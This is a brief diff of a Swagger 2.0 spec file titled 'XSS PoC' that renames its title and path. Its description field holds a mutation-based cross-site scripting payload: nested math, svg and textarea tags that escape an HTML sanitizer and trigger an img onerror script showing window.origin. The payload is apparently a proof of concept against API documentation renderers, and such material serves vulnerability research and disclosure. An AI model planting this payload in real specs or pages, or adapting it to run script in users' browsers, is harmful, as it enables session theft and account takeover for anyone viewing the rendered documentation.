@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
-  title: Tempest XSS PoC
+  title: XSS PoC
   description: |
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
 paths:
-  /tempest:
+  /whatever:
     get:
       responses:
         '200':
